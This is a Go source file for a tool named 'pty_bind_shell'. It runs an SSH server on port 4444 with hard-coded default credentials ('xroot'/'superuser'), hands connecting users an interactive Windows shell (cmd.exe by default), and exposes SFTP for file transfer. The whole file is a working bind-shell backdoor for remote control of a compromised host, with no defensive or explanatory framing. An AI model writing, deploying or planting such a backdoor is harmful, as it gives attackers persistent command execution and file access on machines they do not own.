package main

import (
	"fmt"
	"github.com/akamensky/argparse"
	"github.com/fatih/color"
	"github.com/gliderlabs/ssh"
	"github.com/pkg/sftp"
	"golang.org/x/term"
	"io"
	"os"
	"os/exec"
)

func SftpHandler(sess ssh.Session) {

	debugStream := os.Stdout
	serverOptions := []sftp.ServerOption{
		sftp.WithDebug(debugStream),
	}
	server, err := sftp.NewServer(
		sess,
		serverOptions...,
	)
	if err != nil {
		return
	}
	if err := server.Serve(); err == io.EOF {
		server.Close()
	}

}
func simpleCommandShellHandler(s ssh.Session) {
	closed := false
	term := term.NewTerminal(s, "")
	shell := confirmShellConfig(s)
	c := exec.Command(shell)
	stdout, err := c.StdoutPipe()
	if err != nil {
		return
	}
	stdin, err := c.StdinPipe()
	if err != nil {
		return
	}
	c.Stderr = s.Stderr()
	c.Start()

	defer func() { closed = true }()

	go func() {
		for {
			if !closed {
				comm, _ := term.ReadLine()
				stdin.Write([]byte(comm + "\r\n"))
			} else {
				break
			}
		}
	}()
	for {
		buffer := make([]byte, 1024)
		length, _ := stdout.Read(buffer)
		if length > 0 {
			s.Write(buffer[:length])
		} else {
			c.Process.Kill()
			break
		}
	}
	c.Wait()

}
func requestUserInput(term *term.Terminal, requestText string, defaultVal string) (val string) {
	_val := defaultVal
	for {
		term.Write([]byte(requestText))
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		if line == "" {
			break
		} else {
			_val = line
			break
		}
	}
	return _val
}
func confirmShellConfig(s ssh.Session) (shell string) {
	term := term.NewTerminal(s, ">")
	shellPath := requestUserInput(term, "Please input shell path [cmd.exe]: \n", "cmd.exe")
	return shellPath
}

func exit_on_error(message string, err error) {
	if err != nil {
		color.Red(message)
		fmt.Println(err)
		os.Exit(0)
	}
}

func main() {
	parser := argparse.NewParser("pty_bind_shell", "")
	var HOST *string = parser.String("H", "host", &argparse.Options{Required: false, Default: "0.0.0.0", Help: "Host to bind or connect to"})
	var PORT *string = parser.String("P", "port", &argparse.Options{Required: false, Default: "4444", Help: "Port to bind or connect to"})
	var USERNAME *string = parser.String("u", "username", &argparse.Options{Required: false, Default: "xroot", Help: "SSH username"})
	var PASSWORD *string = parser.String("p", "password", &argparse.Options{Required: false, Default: "superuser", Help: "SSH password"})
	err := parser.Parse(os.Args)
	exit_on_error("[PARSER ERROR]", err)
	server := ssh.Server{
		Addr: *HOST + ":" + *PORT, // IP and PORT to connect on
		PasswordHandler: ssh.PasswordHandler(func(ctx ssh.Context, pass string) bool {
			return pass == *PASSWORD && ctx.User() == *USERNAME
		}),
		SubsystemHandlers: map[string]ssh.SubsystemHandler{
			"sftp": SftpHandler,
		},
		Handler: func(s ssh.Session) {
			io.WriteString(s, "\n[-] Windows dont have tty, using simple command shell.\n")
			simpleCommandShellHandler(s)
		},
	}
	server.ListenAndServe()
}
